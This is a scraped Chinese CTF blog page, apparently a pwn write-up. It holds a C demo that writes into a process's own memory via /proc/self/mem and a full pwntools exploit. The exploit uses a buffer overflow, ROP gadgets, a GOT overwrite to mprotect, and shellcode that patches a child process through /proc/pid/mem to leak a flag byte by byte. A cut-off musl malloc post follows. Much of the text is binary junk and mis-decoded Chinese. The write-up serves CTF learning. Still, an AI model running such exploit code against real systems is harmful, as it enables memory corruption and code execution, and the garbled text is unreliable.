Hï¿½ï¿½ï¿½Hï¿½Hï¿½ï¿½ï¿½Hï¿½ï¿½ï¿½&#x27;ï¿½ï¿½ï¿½ï¿½ï¿½Hï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Hï¿½5ï¿½Hï¿½Ç¸ï¿½zï¿½ï¿½ï¿½Hï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Hï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Hï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Hï¿½Ç¸ï¿½2ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Hï¿½=ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Hï¿½ï¿½ ï¿½ï¿½ï¿½ï¿½ï¿½&#125;Hï¿½ï¿½ï¿½Hï¿½ï¿½Hï¿½=ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Hï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½&#125;Hï¿½ï¿½ï¿½Hï¿½Hï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Hï¿½Î‰ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Hï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Hï¿½Æ¿ï¿½4ï¿½ï¿½ï¿½ï¿½</span><br><span class="line">ï¿½</span><br><span class="line">ï¿½ï¿½ï¿½HÇ…ï¿½ï¿½ï¿½ï¿½Hï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Hï¿½ï¿½Hï¿½=#ï¿½ï¿½tï¿½ï¿½ï¿½Hï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Hï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Hï¿½Î‰ï¿½ï¿½%ï¿½ï¿½ï¿½Hï¿½ï¿½ ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Hï¿½Î‰ï¿½ï¿½ï¿½ï¿½ï¿½Hï¿½ï¿½ ï¿½ï¿½ï¿½ï¿½ï¿½Hï¿½Æ¿ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Hï¿½uï¿½dH34%(tï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½DAWAVIï¿½ï¿½AUATLï¿½%6 UHï¿½-6 SAï¿½ï¿½Iï¿½ï¿½L)ï¿½Hï¿½Hï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Hï¿½ï¿½t 1ï¿½ï¿½Lï¿½ï¿½Lï¿½ï¿½Dï¿½ï¿½Aï¿½ï¿½Hï¿½ï¿½H9ï¿½uï¿½Hï¿½[]A\A]A^A_Ãf.ï¿½ï¿½ï¿½Hï¿½Hï¿½ï¿½/proc/%d/mem%d</span><br><span class="line"><span class="meta">/proc/self/maps%</span><span class="bash">lld;8rootzhang@ubuntu:~/get-shell/tscrf/pwn5$</span> </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ç¨‹åºä¿®æ”¹ä»£ç æ®µå¯¼è‡´ç¨‹åºå¼‚å¸¸</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> s=<span class="number">4</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">	s=<span class="number">5</span>;</span><br><span class="line">	<span class="built_in">sprintf</span>(buf,<span class="string">&quot;/proc/%d/mem&quot;</span>,getpid());</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,buf);</span><br><span class="line">	<span class="keyword">int</span> fd=open(buf,O_RDWR);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,fd);</span><br><span class="line">	<span class="keyword">char</span> buff[<span class="number">0x1000</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">int</span> fd1=open(<span class="string">&quot;/proc/self/maps&quot;</span>,<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">char</span> buff1[<span class="number">1000</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">	read(fd1,buff1,<span class="number">900</span>);</span><br><span class="line">	write(<span class="number">1</span>,buff1,<span class="number">900</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	<span class="keyword">size_t</span> offset=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>,&amp;offset);</span><br><span class="line">	lseek(fd,offset,<span class="number">1</span>);</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x1000</span>;i++)&#123;</span><br><span class="line">		buff[i]=<span class="number">0xcc</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">int</span> ret=write(fd,buff,<span class="number">0x1</span>);</span><br><span class="line">	<span class="keyword">if</span>(ret==<span class="number">-1</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;write fail\n&quot;</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,strerror(errno));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;hock is not ok\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ•ˆæœ</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">rootzhang@ubuntu:~/get-shell/tscrf/pwn5$ ./pwnc</span><br><span class="line">/proc/6461/mem</span><br><span class="line">3</span><br><span class="line">555edf693000-555edf694000 r-xp 00000000 08:01 542793                     /home/rootzhang/get-shell/tscrf/pwn5/pwnc</span><br><span class="line">555edf894000-555edf895000 r--p 00001000 08:01 542793                     /home/rootzhang/get-shell/tscrf/pwn5/pwnc</span><br><span class="line">555edf895000-555edf896000 rw-p 00002000 08:01 542793                     /home/rootzhang/get-shell/tscrf/pwn5/pwnc</span><br><span class="line">555ee0f03000-555ee0f24000 rw-p 00000000 00:00 0                          [heap]</span><br><span class="line">7fcea4c50000-7fcea4e37000 r-xp 00000000 08:01 1192603                    /lib/x86_64-linux-gnu/libc-2.27.so</span><br><span class="line">7fcea4e37000-7fcea5037000 ---p 001e7000 08:01 1192603                    /lib/x86_64-linux-gnu/libc-2.27.so</span><br><span class="line">7fcea5037000-7fcea503b000 r--p 001e7000 08:01 1192603                    /lib/x86_64-linux-gnu/libc-2.27.so</span><br><span class="line">7fcea503b000-7fcea503d000 rw-p 001eb000 08:01 1192603                    /lib/x86_64-linux-gnu/libc-2.27.so</span><br><span class="line">7fcea503d000-7fcea5041000 rw-p 00000000 00:</span><br><span class="line">93865963502584</span><br><span class="line">è¿½è¸ªä¸ä¸­æ–­ç‚¹é™·é˜± (æ ¸å¿ƒå·²è½¬å‚¨)</span><br></pre></td></tr></table></figure>

<p>å¯è§è¿™ä¸ªä¼ªæ–‡ä»¶è¿˜æ˜¯éå¸¸nbçš„ï¼Œå¦‚æœèƒ½å¯¹è¿™ä¸ªä¼ªæ–‡ä»¶è¿›è¡Œwriteçš„è¯ï¼Œå°±å¯ä»¥å¿½è§†è¿™ä¸ªè¿›è¡Œçš„å„ä¸ªæ®µçš„æƒé™è¿›è¡Œä»»æ„ç¯¡æ”¹ã€‚</p>
<p>0x4.3 è§£é¢˜æ€è·¯</p>
<p>1.é¦–å…ˆæ˜¯èƒ½å¤Ÿæ‰§è¡Œä»»æ„åº“å‡½æ•°ï¼Œä½¿ç”¨äº†æˆ‘ä»æœªè§è¿‡çš„gadget</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add [rbp-0x3d],ebx</span><br><span class="line">nop</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<p>åªè¦æ§åˆ¶äº†rbpå’Œebxå°±å¯ä»¥ä¿®æ”¹ä»»æ„æ•°æ®äº†äº†ï¼Œè¿™é‡Œä¿®æ”¹gotè¡¨çš„åœ°å€ä¸ºsyscallï¼Œç„¶åä½¿ç”¨pltè·³åˆ°è¿™ä¸ªgotè¡¨é¡¹å°±å¯ä»¥äº†ã€‚</p>
<p>2.æŠŠgetpidçš„gotæ”¹æˆmprotectï¼Œç„¶åè°ƒç”¨mprotectä½¿å¾—bssæ®µrwx,ç„¶åè·³åˆ°bssæ®µ</p>
<p>3.çˆ¶è¿›ç¨‹è°ƒç”¨è°ƒç”¨open(â€˜/proc/pid/memâ€™,2,0)å…¶ä¸­2ä»£è¡¨æ˜¯å¯å†™æƒé™ï¼Œç„¶åè°ƒç”¨lseek(fd,offset,0)æŠŠæ–‡ä»¶è¯»å†™æŒ‡é’ˆæŒ‡å¯¼sleepåé¢çš„ä¸€ä¸ªåœ°å€ï¼Œç„¶åwrite(fd,text,count),æ”¹å†™sleep()åé¢çš„ä»£ç ï¼Œç„¶åä½¿ç”¨wait(-1,addr,0)ç­‰å¾…è¿™ä¸ªå­è¿›ç¨‹ç»“æŸï¼Œè¿™ä¸ªå­è¿›ç¨‹çš„è¿”å›å€¼å°±æ˜¯ä¸€ä¸ªflagçš„å­—ç¬¦ï¼Œå‚¨å­˜åœ¨addr+1çš„ä½ç½®ï¼Œæœ€åä½¿ç”¨writeè¾“å‡º</p>
<p>å…¶ä¸­æœ‰å‡ ä¸ªå‡½æ•°æ¯”è¾ƒé™Œç”Ÿ</p>
<p><strong>lseek(int fd, off_t offset, int whence)</strong>:å¯ä»¥è®¾ç½®fdçš„å½“å‰è¯»å†™æŒ‡é’ˆï¼Œå…¶ä¸­whenceå‚æ•°æœ‰ä¸‰ä¸ª</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SEEK_SET:0#ä»æ–‡ä»¶å¤´éƒ¨å¼€å§‹åç§»offsetä¸ªå­—èŠ‚</span><br><span class="line">SEEK_CUR:1#ä»æ–‡ä»¶å½“å‰è¯»å†™çš„æŒ‡é’ˆä½ç½®å¼€å§‹ï¼Œå¢åŠ offsetä¸ªå­—èŠ‚çš„åç§»é‡</span><br><span class="line">SEEK_END:2#æ–‡ä»¶åç§»é‡è®¾ç½®ä¸ºæ–‡ä»¶çš„å¤§å°åŠ ä¸Šåç§»é‡å­—èŠ‚</span><br></pre></td></tr></table></figure>

<p>**wait4 ( pid_t <em>pid</em>, int <strong>status*, int <em>option</em>, struct rusage *<em>ru</em> )</strong>,é˜»å¡ç­‰å¾…æŒ‡å®šçš„å­è¿›ç¨‹ï¼Œç„¶åæŠŠè¿›ç¨‹ä¿¡æ¯æ”¾åœ¨ç¬¬äºŒä¸ªå‚æ•°çš„åœ°æ–¹ï¼Œå¦‚æœpid=-1,åˆ™æ˜¯ç­‰å¾…æ‰€æœ‰å­è¿›ç¨‹</p>
<p>4.å­è¿›ç¨‹è°ƒç”¨open(â€œ./flagâ€,0),ç„¶åè°ƒç”¨lseek(fd,offset,0)å®šä½è¯»å†™æŒ‡é’ˆï¼Œç„¶åè°ƒç”¨read(fd,addr,1)è¯»å…¥ä¸€ä¸ªflag,æœ€åexit(*addr)æŠŠè¿™ä¸ªå­—ç¬¦é€šè¿‡exitè¿”å›ï¼Œè¿™æ ·çˆ¶è¿›ç¨‹å°±å¯ä»¥é€šè¿‡wait()å‡½æ•°è·å¾—å…¶è¿”å›å€¼äº†ã€‚</p>
<h4 id="0x4-3-è„šæœ¬"><a href="#0x4-3-è„šæœ¬" class="headerlink" title="0x4.3 è„šæœ¬"></a>0x4.3 è„šæœ¬</h4><p>é‡ç‚¹å‚è€ƒäº†å®˜æ–¹wpå’Œayoungä½¬çš„è„šæœ¬ï¼Œä¸è¿‡ç°åœ¨å¥½åƒä¹Ÿå°±è¿™ä¸¤ä¸ªwp,ç¬¬ä¸€æ¬¡å†™è¿™ä¹ˆå¤šçš„æ±‡ç¼–ï¼Œè€Œä¸”è¿˜æ˜¯å¤šè¿›ç¨‹çš„ï¼Œå†™çš„æ—¶å€™èƒ†æˆ˜å¿ƒæƒŠç”Ÿæ€•å†™é”™,æœ€ååœ¨writeé‚£é‡Œå°‘èµ‹å€¼äº†raxè€½è¯¯äº†ä¸€ä¼šï¼Œä¸è¿‡å¹¸å¥½é—®é¢˜ä¸å¤§ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">pop_rdi=<span class="number">0x0000000000401573</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x0000000000401571</span></span><br><span class="line">duan=<span class="string">&#x27;b *(&#123;0&#125;)&#x27;</span>.<span class="built_in">format</span>(<span class="number">0x401505</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh,duan)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">offset</span>):</span></span><br><span class="line">    sh=process([<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/ld-2.31.so&#x27;</span>, <span class="string">&#x27;./pwn&#x27;</span>], env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc-2.31.so&#x27;</span>&#125;)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc-2.31.so&#x27;</span>)</span><br><span class="line">    <span class="comment"># sh=process(&#x27;./pwn1&#x27;)</span></span><br><span class="line">    elf=ELF(<span class="string">&quot;./pwn1&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Mute&#x27;s pid is &quot;</span>)</span><br><span class="line">    father_pid=<span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">    parent_shellcode=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    /*open(&quot;/proc/pid/mem&quot;,2,0)*/</span></span><br><span class="line"><span class="string">    mov rdi, 0x4047e0</span></span><br><span class="line"><span class="string">    mov rsi,2</span></span><br><span class="line"><span class="string">    mov rdx, 0</span></span><br><span class="line"><span class="string">    mov rax, 2</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    /*lseek(3,offset,0)*/</span></span><br><span class="line"><span class="string">    mov rdi, rax</span></span><br><span class="line"><span class="string">    mov rsi, 0x4013B8</span></span><br><span class="line"><span class="string">    mov rdx, 0</span></span><br><span class="line"><span class="string">    mov rax, 8</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    /*write(fd,0x4042E0+0x300,0x70)*/</span></span><br><span class="line"><span class="string">    mov rsi, 0x4045e0</span></span><br><span class="line"><span class="string">    mov rdx,0x70</span></span><br><span class="line"><span class="string">    mov rax, 1</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    /*wait4(-1,0x4042E0+0x800,0,0)*/</span></span><br><span class="line"><span class="string">    mov rdi, 0xffffffffffffffff</span></span><br><span class="line"><span class="string">    mov rsi, 0x404ae0</span></span><br><span class="line"><span class="string">    mov rdx, 0</span></span><br><span class="line"><span class="string">    mov rcx, 0</span></span><br><span class="line"><span class="string">    mov rax, 61</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    /*write(1,0x4042E0+0x801,0x1)*/</span></span><br><span class="line"><span class="string">    mov rax, 1</span></span><br><span class="line"><span class="string">    mov rdi, 1</span></span><br><span class="line"><span class="string">    mov rsi,0x404ae1</span></span><br><span class="line"><span class="string">    mov rdx, 1</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    child_shellcode=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    /*open(&#x27;./flag&#x27;,0,0)*/</span></span><br><span class="line"><span class="string">    mov rax, 0x67616c662f2e</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    mov rdi, rsp</span></span><br><span class="line"><span class="string">    mov rsi, 0</span></span><br><span class="line"><span class="string">    mov rdx, 0</span></span><br><span class="line"><span class="string">    mov rax, 2</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    /*lseek(fd,offset,0)*/</span></span><br><span class="line"><span class="string">    mov rdi, rax</span></span><br><span class="line"><span class="string">    mov rsi, &#123;0&#125;</span></span><br><span class="line"><span class="string">    mov rdx, 0</span></span><br><span class="line"><span class="string">    mov rax, 8</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    /*read(fd,0x4042E0,1)*/</span></span><br><span class="line"><span class="string">    mov rsi, 0x4042E0</span></span><br><span class="line"><span class="string">    mov rdx, 1</span></span><br><span class="line"><span class="string">    mov rax, 0</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    /*exit(flag)*/</span></span><br><span class="line"><span class="string">    mov rdi, [rsi]</span></span><br><span class="line"><span class="string">    mov rax, 60</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(offset)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Maybe a Gift?&quot;</span>)</span><br><span class="line">    pay=asm(parent_shellcode)</span><br><span class="line">    pay=pay.ljust(<span class="number">0x300</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    pay+=asm(child_shellcode)</span><br><span class="line">    pay=pay.ljust(<span class="number">0x500</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    pay+=<span class="string">&#x27;/proc/&#x27;</span>+<span class="built_in">str</span>(father_pid+<span class="number">1</span>)+<span class="string">&#x27;/mem\x00&#x27;</span></span><br><span class="line">    sh.send(pay)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;A overflow?&quot;</span>)</span><br><span class="line">    csu1=<span class="number">0x40156A</span></span><br><span class="line">    csu2=<span class="number">0x401550</span></span><br><span class="line">    getpid_got=elf.got[<span class="string">&quot;getpid&quot;</span>]</span><br><span class="line">    pay=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x48</span>+p64(csu1)</span><br><span class="line">    pay+=p64(<span class="number">0x348e0</span>)+p64(getpid_got+<span class="number">0x3d</span>)</span><br><span class="line">    pay+=p64(<span class="number">0x404000</span>)+p64(<span class="number">0x1000</span>)</span><br><span class="line">    pay+=p64(<span class="number">7</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x40123c</span>)</span><br><span class="line">    pay+=p64(csu1)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</span><br><span class="line">    pay+=p64(<span class="number">0x404000</span>)+p64(<span class="number">0x2000</span>)+p64(<span class="number">7</span>)</span><br><span class="line">    pay+=p64(<span class="number">0x404020</span>)+p64(csu2)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">7</span>+p64(<span class="number">0x4042E0</span>)</span><br><span class="line">    sh.send(pay)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    flag=sh.recv(<span class="number">1</span>)</span><br><span class="line">    sh.close()</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">    s=exp(i)</span><br><span class="line">    flag+=s</span><br><span class="line">    <span class="keyword">if</span> s==<span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span> flag</span><br></pre></td></tr></table></figure>


















      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/20/musl%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB-ctf%E5%89%8D%E4%B8%A4%E9%81%93pwn/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="æˆ‘çš„åšå®¢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/04/20/musl%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB-ctf%E5%89%8D%E4%B8%A4%E9%81%93pwn/" class="post-title-link" itemprop="url">muslæºç é˜…è¯»&*ctfå‰ä¸¤é“pwn</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2022-04-20 14:35:40 / ä¿®æ”¹æ—¶é—´ï¼š14:36:30" itemprop="dateCreated datePublished" datetime="2022-04-20T14:35:40+08:00">2022-04-20</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="muslæºç é˜…è¯»-amp-ctf-å‰ä¸¤é“pwn"><a href="#muslæºç é˜…è¯»-amp-ctf-å‰ä¸¤é“pwn" class="headerlink" title="muslæºç é˜…è¯»&amp;*ctf å‰ä¸¤é“pwn"></a>muslæºç é˜…è¯»&amp;*ctf å‰ä¸¤é“pwn</h1><h2 id="0x1-æºç "><a href="#0x1-æºç " class="headerlink" title="0x1 æºç "></a>0x1 æºç </h2><h3 id="0x1-1-é‡è¦ç»“æ„ä½“"><a href="#0x1-1-é‡è¦ç»“æ„ä½“" class="headerlink" title="0x1.1 é‡è¦ç»“æ„ä½“"></a>0x1.1 é‡è¦ç»“æ„ä½“</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">truct chunk&#123;</span><br><span class="line"> <span class="keyword">char</span> prev_user_data[];</span><br><span class="line">    <span class="keyword">uint8_t</span> idx;  <span class="comment">//ç¬¬5bitä¸ºidxç¬¬å‡ ä¸ªchunk</span></span><br><span class="line">    <span class="keyword">uint16_t</span> offset; <span class="comment">//ä¸groupçš„åç§»</span></span><br><span class="line">    <span class="keyword">char</span> data[];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span>;</span><span class="comment">// metaçš„åœ°å€</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> active_idx:<span class="number">5</span>;</span><br><span class="line">    <span class="keyword">char</span> pad[UNIT - <span class="keyword">sizeof</span>(struct meta *) - <span class="number">1</span>];<span class="comment">// ä¿è¯0x10å­—èŠ‚å¯¹é½</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> storage[];<span class="meta"># chunk</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span 